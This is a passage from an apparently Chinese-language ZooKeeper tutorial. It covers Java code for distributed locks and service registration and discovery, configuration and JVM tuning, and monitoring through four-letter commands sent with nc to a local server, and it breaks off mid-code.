<p>分布式锁是分布式系统中协调资源访问的关键组件。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DistributedLock</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ZooKeeper zk;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String lockPath;
    <span class="hljs-keyword">private</span> String currentLockPath;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">lockAcquiredLatch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(<span class="hljs-number">1</span>);
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">hasLock</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DistributedLock</span><span class="hljs-params">(ZooKeeper zk, String lockPath)</span> {
        <span class="hljs-built_in">this</span>.zk = zk;
        <span class="hljs-built_in">this</span>.lockPath = lockPath;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> timeout, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 确保锁目录存在</span>
        ensureLockPathExists();
        
        <span class="hljs-comment">// 创建临时有序节点</span>
        currentLockPath = zk.create(lockPath + <span class="hljs-string">"/lock-"</span>, 
                                   Thread.currentThread().getName().getBytes(),
                                   ZooDefs.Ids.OPEN_ACL_UNSAFE,
                                   CreateMode.EPHEMERAL_SEQUENTIAL);
        
        System.out.println(<span class="hljs-string">"创建锁节点: "</span> + currentLockPath);
        
        <span class="hljs-comment">// 尝试获取锁</span>
        <span class="hljs-keyword">return</span> attemptLockAcquisition(timeout, unit);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ensureLockPathExists</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">if</span> (zk.exists(lockPath, <span class="hljs-literal">false</span>) == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">try</span> {
                zk.create(lockPath, 
                         <span class="hljs-literal">null</span>,
                         ZooDefs.Ids.OPEN_ACL_UNSAFE,
                         CreateMode.PERSISTENT);
            } <span class="hljs-keyword">catch</span> (KeeperException.NodeExistsException e) {
                <span class="hljs-comment">// 节点已存在，忽略</span>
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">attemptLockAcquisition</span><span class="hljs-params">(<span class="hljs-type">long</span> timeout, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 获取所有锁节点</span>
        List&lt;String&gt; lockNodes = zk.getChildren(lockPath, <span class="hljs-literal">false</span>);
        Collections.sort(lockNodes); <span class="hljs-comment">// 按序列号排序</span>
        
        <span class="hljs-type">String</span> <span class="hljs-variable">currentLockName</span> <span class="hljs-operator">=</span> currentLockPath.substring(lockPath.length() + <span class="hljs-number">1</span>);
        <span class="hljs-type">int</span> <span class="hljs-variable">currentIndex</span> <span class="hljs-operator">=</span> lockNodes.indexOf(currentLockName);
        
        <span class="hljs-keyword">if</span> (currentIndex &lt; <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// 当前节点不存在，可能已被删除</span>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"锁节点不存在: "</span> + currentLockName);
        }
        
        <span class="hljs-keyword">if</span> (currentIndex == <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// 当前节点是最小序号，获得锁</span>
            hasLock = <span class="hljs-literal">true</span>;
            System.out.println(<span class="hljs-string">"成功获得锁: "</span> + currentLockPath);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 监听前一个节点</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">previousLockPath</span> <span class="hljs-operator">=</span> lockPath + <span class="hljs-string">"/"</span> + lockNodes.get(currentIndex - <span class="hljs-number">1</span>);
            System.out.println(<span class="hljs-string">"等待前一个锁释放: "</span> + previousLockPath);
            
            <span class="hljs-comment">// 设置监听器</span>
            <span class="hljs-type">Stat</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> zk.exists(previousLockPath, event -&gt; {
                <span class="hljs-keyword">if</span> (event.getType() == EventType.NodeDeleted) {
                    lockAcquiredLatch.countDown();
                }
            });
            
            <span class="hljs-keyword">if</span> (stat == <span class="hljs-literal">null</span>) {
                <span class="hljs-comment">// 前一个节点已不存在，重试</span>
                <span class="hljs-keyword">return</span> attemptLockAcquisition(timeout, unit);
            }
            
            <span class="hljs-comment">// 等待锁释放或超时</span>
            <span class="hljs-type">boolean</span> <span class="hljs-variable">acquired</span> <span class="hljs-operator">=</span> lockAcquiredLatch.await(timeout, unit);
            <span class="hljs-keyword">if</span> (acquired) {
                hasLock = <span class="hljs-literal">true</span>;
                System.out.println(<span class="hljs-string">"成功获得锁: "</span> + currentLockPath);
            } <span class="hljs-keyword">else</span> {
                System.out.println(<span class="hljs-string">"获取锁超时: "</span> + currentLockPath);
                <span class="hljs-comment">// 清理当前节点</span>
                cleanup();
            }
            <span class="hljs-keyword">return</span> acquired;
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">if</span> (hasLock &amp;&amp; currentLockPath != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">try</span> {
                zk.delete(currentLockPath, -<span class="hljs-number">1</span>);
                System.out.println(<span class="hljs-string">"释放锁: "</span> + currentLockPath);
            } <span class="hljs-keyword">catch</span> (KeeperException.NoNodeException e) {
                <span class="hljs-comment">// 节点已不存在，忽略</span>
            } <span class="hljs-keyword">finally</span> {
                hasLock = <span class="hljs-literal">false</span>;
                currentLockPath = <span class="hljs-literal">null</span>;
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cleanup</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">if</span> (currentLockPath != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">try</span> {
                zk.delete(currentLockPath, -<span class="hljs-number">1</span>);
            } <span class="hljs-keyword">catch</span> (KeeperException.NoNodeException e) {
                <span class="hljs-comment">// 节点已不存在，忽略</span>
            }
            currentLockPath = <span class="hljs-literal">null</span>;
        }
        hasLock = <span class="hljs-literal">false</span>;
    }
    
    <span class="hljs-comment">// 自动释放锁的实现</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">if</span> (!tryLock(Long.MAX_VALUE, TimeUnit.MILLISECONDS)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"获取锁失败"</span>);
        }
    }
    
    <span class="hljs-comment">// 带回调的锁获取</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lockWithCallback</span><span class="hljs-params">(Runnable criticalSection)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">try</span> {
            lock();
            criticalSection.run();
        } <span class="hljs-keyword">finally</span> {
            unlock();
        }
    }
}
</code></pre>
<p><strong>分布式锁使用示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">THREAD_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">startLatch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(<span class="hljs-number">1</span>);
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">endLatch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(THREAD_COUNT);
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">ZooKeeper</span> <span class="hljs-variable">zk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZooKeeper</span>(<span class="hljs-string">"localhost:2181"</span>, <span class="hljs-number">3000</span>, <span class="hljs-literal">null</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">lockPath</span> <span class="hljs-operator">=</span> <span class="hljs-string">"/app/locks/resource"</span>;
        
        <span class="hljs-comment">// 创建多个线程竞争锁</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; THREAD_COUNT; i++) {
            <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">threadId</span> <span class="hljs-operator">=</span> i;
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-type">DistributedLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DistributedLock</span>(zk, lockPath);
                    
                    <span class="hljs-comment">// 等待开始信号</span>
                    startLatch.await();
                    
                    System.out.println(<span class="hljs-string">"线程 "</span> + threadId + <span class="hljs-string">" 尝试获取锁"</span>);
                    
                    <span class="hljs-keyword">if</span> (lock.tryLock(<span class="hljs-number">10</span>, TimeUnit.SECONDS)) {
                        <span class="hljs-keyword">try</span> {
                            System.out.println(<span class="hljs-string">"&gt;&gt;&gt; 线程 "</span> + threadId + <span class="hljs-string">" 获得锁，执行关键代码"</span>);
                            Thread.sleep(<span class="hljs-number">2000</span>); <span class="hljs-comment">// 模拟业务处理</span>
                            System.out.println(<span class="hljs-string">"&gt;&gt;&gt; 线程 "</span> + threadId + <span class="hljs-string">" 释放锁"</span>);
                        } <span class="hljs-keyword">finally</span> {
                            lock.unlock();
                        }
                    } <span class="hljs-keyword">else</span> {
                        System.out.println(<span class="hljs-string">"线程 "</span> + threadId + <span class="hljs-string">" 获取锁超时"</span>);
                    }
                } <span class="hljs-keyword">catch</span> (Exception e) {
                    e.printStackTrace();
                } <span class="hljs-keyword">finally</span> {
                    endLatch.countDown();
                }
            }).start();
        }
        
        <span class="hljs-comment">// 同时启动所有线程</span>
        Thread.sleep(<span class="hljs-number">1000</span>);
        startLatch.countDown();
        
        <span class="hljs-comment">// 等待所有线程完成</span>
        endLatch.await();
        zk.close();
    }
}
</code></pre>
<h3 data-id="heading-36">4.3 服务注册与发现系统</h3>
<p>服务注册与发现是微服务架构中的核心组件。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServiceRegistry</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">REGISTRY_ROOT</span> <span class="hljs-operator">=</span> <span class="hljs-string">"/services"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ZooKeeper zk;
    <span class="hljs-keyword">private</span> String currentServicePath;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String serviceName;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String serviceAddress;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ServiceRegistry</span><span class="hljs-params">(ZooKeeper zk, String serviceName, String serviceAddress)</span> {
        <span class="hljs-built_in">this</span>.zk = zk;
        <span class="hljs-built_in">this</span>.serviceName = serviceName;
        <span class="hljs-built_in">this</span>.serviceAddress = serviceAddress;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 确保注册中心根目录存在</span>
        ensureRegistryRootExists();
        
        <span class="hljs-comment">// 创建服务目录</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">servicePath</span> <span class="hljs-operator">=</span> REGISTRY_ROOT + <span class="hljs-string">"/"</span> + serviceName;
        <span class="hljs-keyword">if</span> (zk.exists(servicePath, <span class="hljs-literal">false</span>) == <span class="hljs-literal">null</span>) {
            zk.create(servicePath, 
                     <span class="hljs-literal">null</span>,
                     ZooDefs.Ids.OPEN_ACL_UNSAFE,
                     CreateMode.PERSISTENT);
        }
        
        <span class="hljs-comment">// 注册服务实例（临时有序节点）</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">instancePath</span> <span class="hljs-operator">=</span> servicePath + <span class="hljs-string">"/instance-"</span>;
        currentServicePath = zk.create(instancePath,
                                      serviceAddress.getBytes(),
                                      ZooDefs.Ids.OPEN_ACL_UNSAFE,
                                      CreateMode.EPHEMERAL_SEQUENTIAL);
        
        System.out.println(<span class="hljs-string">"服务注册成功: "</span> + currentServicePath + <span class="hljs-string">" -&gt; "</span> + serviceAddress);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unregister</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">if</span> (currentServicePath != <span class="hljs-literal">null</span>) {
            zk.delete(currentServicePath, -<span class="hljs-number">1</span>);
            System.out.println(<span class="hljs-string">"服务注销: "</span> + currentServicePath);
            currentServicePath = <span class="hljs-literal">null</span>;
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ensureRegistryRootExists</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">if</span> (zk.exists(REGISTRY_ROOT, <span class="hljs-literal">false</span>) == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">try</span> {
                zk.create(REGISTRY_ROOT,
                         <span class="hljs-literal">null</span>,
                         ZooDefs.Ids.OPEN_ACL_UNSAFE,
                         CreateMode.PERSISTENT);
            } <span class="hljs-keyword">catch</span> (KeeperException.NodeExistsException e) {
                <span class="hljs-comment">// 节点已存在，忽略</span>
            }
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServiceDiscovery</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ZooKeeper zk;
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, List&lt;String&gt;&gt; serviceInstances = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;ServiceDiscoveryListener&gt; listeners = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArrayList</span>&lt;&gt;();
        
        <span class="hljs-keyword">public</span> <span class="hljs-title function_">ServiceDiscovery</span><span class="hljs-params">(ZooKeeper zk)</span> {
            <span class="hljs-built_in">this</span>.zk = zk;
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">watchService</span><span class="hljs-params">(String serviceName)</span> <span class="hljs-keyword">throws</span> Exception {
            <span class="hljs-type">String</span> <span class="hljs-variable">servicePath</span> <span class="hljs-operator">=</span> REGISTRY_ROOT + <span class="hljs-string">"/"</span> + serviceName;
            
            <span class="hljs-comment">// 监听服务实例变化</span>
            <span class="hljs-type">ChildWatcher</span> <span class="hljs-variable">childWatcher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChildWatcher</span>(serviceName);
            List&lt;String&gt; instances = zk.getChildren(servicePath, childWatcher);
            
            updateServiceInstances(serviceName, instances);
        }
        
        <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getServiceInstances</span><span class="hljs-params">(String serviceName)</span> {
            <span class="hljs-keyword">return</span> serviceInstances.getOrDefault(serviceName, Collections.emptyList());
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addListener</span><span class="hljs-params">(ServiceDiscoveryListener listener)</span> {
            listeners.add(listener);
        }
        
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateServiceInstances</span><span class="hljs-params">(String serviceName, List&lt;String&gt; instances)</span> <span class="hljs-keyword">throws</span> Exception {
            List&lt;String&gt; addresses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
            
            <span class="hljs-keyword">for</span> (String instance : instances) {
                <span class="hljs-type">String</span> <span class="hljs-variable">instancePath</span> <span class="hljs-operator">=</span> REGISTRY_ROOT + <span class="hljs-string">"/"</span> + serviceName + <span class="hljs-string">"/"</span> + instance;
                <span class="hljs-type">byte</span>[] data = zk.getData(instancePath, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>);
                addresses.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(data));
            }
            
            List&lt;String&gt; oldAddresses = serviceInstances.put(serviceName, addresses);
            
            <span class="hljs-comment">// 通知监听器</span>
            <span class="hljs-keyword">if</span> (!addresses.equals(oldAddresses)) {
                <span class="hljs-keyword">for</span> (ServiceDiscoveryListener listener : listeners) {
                    listener.onServiceChanged(serviceName, addresses);
                }
            }
            
            System.out.println(<span class="hljs-string">"服务 "</span> + serviceName + <span class="hljs-string">" 实例更新: "</span> + addresses);
        }
        
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChildWatcher</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Watcher</span> {
            <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String serviceName;
            
            <span class="hljs-keyword">public</span> <span class="hljs-title function_">ChildWatcher</span><span class="hljs-params">(String serviceName)</span> {
                <span class="hljs-built_in">this</span>.serviceName = serviceName;
            }
            
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">(WatchedEvent event)</span> {
                <span class="hljs-keyword">if</span> (event.getType() == EventType.NodeChildrenChanged) {
                    <span class="hljs-keyword">try</span> {
                        <span class="hljs-type">String</span> <span class="hljs-variable">servicePath</span> <span class="hljs-operator">=</span> REGISTRY_ROOT + <span class="hljs-string">"/"</span> + serviceName;
                        List&lt;String&gt; newInstances = zk.getChildren(servicePath, <span class="hljs-built_in">this</span>);
                        updateServiceInstances(serviceName, newInstances);
                    } <span class="hljs-keyword">catch</span> (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ServiceDiscoveryListener</span> {
            <span class="hljs-keyword">void</span> <span class="hljs-title function_">onServiceChanged</span><span class="hljs-params">(String serviceName, List&lt;String&gt; instances)</span>;
        }
    }
}
</code></pre>
<p><strong>服务注册发现使用示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServiceRegistryExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">ZooKeeper</span> <span class="hljs-variable">zk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZooKeeper</span>(<span class="hljs-string">"localhost:2181"</span>, <span class="hljs-number">3000</span>, <span class="hljs-literal">null</span>);
        
        <span class="hljs-comment">// 服务提供者 - 注册服务</span>
        <span class="hljs-type">ServiceRegistry</span> <span class="hljs-variable">provider1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceRegistry</span>(zk, <span class="hljs-string">"user-service"</span>, <span class="hljs-string">"192.168.1.101:8080"</span>);
        <span class="hljs-type">ServiceRegistry</span> <span class="hljs-variable">provider2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceRegistry</span>(zk, <span class="hljs-string">"user-service"</span>, <span class="hljs-string">"192.168.1.102:8080"</span>);
        <span class="hljs-type">ServiceRegistry</span> <span class="hljs-variable">provider3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceRegistry</span>(zk, <span class="hljs-string">"order-service"</span>, <span class="hljs-string">"192.168.1.103:8080"</span>);
        
        provider1.register();
        provider2.register();
        provider3.register();
        
        <span class="hljs-comment">// 服务消费者 - 发现服务</span>
        ServiceRegistry.<span class="hljs-type">ServiceDiscovery</span> <span class="hljs-variable">discovery</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceRegistry</span>.ServiceDiscovery(zk);
        
        discovery.addListener((serviceName, instances) -&gt; {
            System.out.println(<span class="hljs-string">"=== 服务变化通知 ==="</span>);
            System.out.println(<span class="hljs-string">"服务: "</span> + serviceName);
            System.out.println(<span class="hljs-string">"实例: "</span> + instances);
            System.out.println(<span class="hljs-string">"=================="</span>);
        });
        
        discovery.watchService(<span class="hljs-string">"user-service"</span>);
        discovery.watchService(<span class="hljs-string">"order-service"</span>);
        
        <span class="hljs-comment">// 模拟服务变化</span>
        Thread.sleep(<span class="hljs-number">30000</span>);
        
        <span class="hljs-comment">// 获取当前服务实例</span>
        List&lt;String&gt; userServices = discovery.getServiceInstances(<span class="hljs-string">"user-service"</span>);
        System.out.println(<span class="hljs-string">"当前用户服务实例: "</span> + userServices);
        
        <span class="hljs-comment">// 清理</span>
        provider1.unregister();
        provider2.unregister();
        provider3.unregister();
        zk.close();
    }
}
</code></pre>
<h2 data-id="heading-37">5. 性能优化与最佳实践</h2>
<h3 data-id="heading-38">5.1 性能优化策略</h3>
<h4 data-id="heading-39">5.1.1 会话管理优化</h4>
<pre><code class="hljs language-properties" lang="properties"># 会话超时优化
tickTime=2000
minSessionTimeout=4000    # 2 * tickTime
maxSessionTimeout=20000   # 10 * tickTime

# 连接管理
maxClientCnxns=100        # 单个IP最大连接数
globalOutstandingLimit=1000  # 全局待处理请求限制
</code></pre>
<h4 data-id="heading-40">5.1.2 数据存储优化</h4>
<pre><code class="hljs language-properties" lang="properties"># 数据目录分离
dataDir=/data/zookeeper/snapshot   # 快照目录
dataLogDir=/data/zookeeper/logs    # 事务日志目录（建议使用SSD）

# 存储优化
preAllocSize=65536        # 预分配文件大小
snapCount=100000          # 多少次事务后做快照
autopurge.snapRetainCount=5    # 保留的快照数量
autopurge.purgeInterval=6      # 清理间隔（小时）
</code></pre>
<h4 data-id="heading-41">5.1.3 JVM 优化</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># JVM 参数示例</span>
<span class="hljs-built_in">export</span> JVMFLAGS=<span class="hljs-string">"-Xmx4G -Xms4G -XX:+UseG1GC 
                 -XX:MaxGCPauseMillis=200 
                 -XX:ParallelGCThreads=8
                 -XX:ConcGCThreads=4
                 -Xloggc:/var/log/zookeeper/gc.log
                 -XX:+PrintGCDetails
                 -XX:+PrintGCDateStamps"</span>
</code></pre>
<h3 data-id="heading-42">5.2 监控与运维</h3>
<h4 data-id="heading-43">5.2.1 关键监控指标</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ZooKeeperMonitor</span> {
    <span class="hljs-comment">// 关键性能指标监控</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">monitorKeyMetrics</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. 节点数量监控</span>
        monitorZnodeCount();
        
        <span class="hljs-comment">// 2. 会话状态监控</span>
        monitorSessionStats();
        
        <span class="hljs-comment">// 3. 请求吞吐量监控</span>
        monitorRequestThroughput();
        
        <span class="hljs-comment">// 4. 延迟监控</span>
        monitorRequestLatency();
        
        <span class="hljs-comment">// 5. 集群健康状态</span>
        monitorClusterHealth();
        
        <span class="hljs-comment">// 6. 磁盘使用监控</span>
        monitorDiskUsage();
        
        <span class="hljs-comment">// 7. 网络连接监控</span>
        monitorNetworkConnections();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">monitorZnodeCount</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 使用四字命令获取统计信息</span>
            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">"echo mntr | nc localhost 2181"</span>);
            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));
            
            String line;
            <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">if</span> (line.startsWith(<span class="hljs-string">"zk_znode_count"</span>)) {
                    System.out.println(<span class="hljs-string">"当前节点数量: "</span> + line.split(<span class="hljs-string">"\t"</span>)[<span class="hljs-number">1</span>]);
                }
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            e.printStackTrace();
        }
    }
}
</code></pre>
<h4 data-id="heading-44">5.2.2 四字命令监控工具</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># ZooKeeper 监控脚本</span>

ZK_HOST=<span class="hljs-string">"localhost"</span>
ZK_PORT=<span class="hljs-string">"2181"</span>

<span class="hljs-comment"># 检查服务器状态</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"=== ZooKeeper 服务器状态 ==="</span>
<span class="hljs-built_in">echo</span> <span class="hljs-built_in">stat</span> | nc <span class="hljs-variable">$ZK_HOST</span> <span class="hljs-variable">$ZK_PORT</span>

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n=== ZooKeeper 配置信息 ==="</span>  
<span class="hljs-built_in">echo</span> conf | nc <span class="hljs-variable">$ZK_HOST</span> <span class="hljs-variable">$ZK_PORT</span>

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n=== 客户端连接信息 ==="</span>
<span class="hljs-built_in">echo</span> cons | nc <span class="hljs-variable">$ZK_HOST</span> <span class="hljs-variable">$ZK_PORT</span>

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n=== 监控指标 ==="</span>
<span class="hljs-built_in">echo</span> mntr | nc <span class="hljs-variable">$ZK_HOST</span> <span class="hljs-variable">$ZK_PORT</span>

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\n=== 环境信息 ==="</span>
<span class="hljs-built_in">echo</span> envi | nc <span class="hljs-variable">$ZK_HOST</span> <span class="hljs-variable">$ZK_PORT</span>
</code></pre>
<h4 data-id="heading-45">5.2.3 健康检查脚本</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HealthChecker</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isHealthy</span><span class="hljs-params">(String connectString)</span> {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">ZooKeeper</span> <span class="hljs-variable">zk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZooKeeper</span>(connectString, <span class="hljs-number">5000</span>, <span class="hljs-literal">null</span>)) {
            <span class="hljs-comment">// 等待连接建立</span>
            Thread.sleep(<span class="hljs-number">1000</span>);
            
            <span class="hljs-comment">// 检查是否可以读取根节点</span>
            zk.getData(<span class="hljs-string">"/"</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>);
            
            <span class="hljs-comment">// 检查会话状态</span>
            ZooKeeper.<span class="hljs-type">States</span> <span class="hljs-variable">state</span> <span class="hljs-operator">=</span> zk.getState();
            <span class="hljs-keyword">return</span> state == ZooKeeper.States.CONNECTED;
            
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }
    
    <span class="hljs-keyword">public</span> ClusterHealth <span class="hljs-title function_">checkClusterHealth</span><span class="hljs-params">(List&lt;String&gt; servers)</span> {
        <span class="hljs-type">ClusterHealth</span> <span class="hljs-variable">health</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClusterHealth</span>();
        
        <span class="hljs-keyword">for</span> (String server : servers) {
